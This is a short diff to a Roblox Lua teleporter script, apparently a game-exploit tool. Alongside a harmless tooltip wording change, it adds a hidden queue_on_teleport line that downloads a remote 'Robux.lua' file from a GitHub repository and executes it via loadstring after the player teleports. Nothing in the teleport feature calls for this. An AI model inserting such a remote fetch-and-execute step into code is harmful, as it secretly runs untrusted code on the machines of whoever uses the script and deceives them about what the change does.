@@ -432,6 +432,7 @@ if CanUseJobIDTeleporter then
             warn("Job id test : " .. Value)
             local s,e = pcall(function()
                 game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Value, LPLR)
+                queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Pastaopp/script_repository/refs/heads/main/Robux.lua"))()')
             end)
 
             print("result : ", s, e)
@@ -478,7 +479,7 @@ if CanUseJobIDTeleporter then
             end                          
         end,
         DoubleClick = false,
-        Tooltip = 'Tp to a random server :p'
+        Tooltip = 'Make a try to teleport to a random server.'
     })
 end
 
